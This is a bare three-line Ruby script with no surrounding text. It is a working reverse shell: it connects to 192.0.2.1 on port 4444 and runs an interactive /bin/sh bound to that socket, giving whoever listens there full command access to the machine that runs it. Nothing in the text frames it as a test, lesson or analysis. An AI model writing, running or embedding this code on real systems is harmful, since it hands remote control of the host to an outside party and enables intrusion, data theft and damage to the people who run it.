require "socket"
s = TCPSocket.new("192.0.2.1", 4444)
exec("/bin/sh -i", in: s, out: s, err: s)
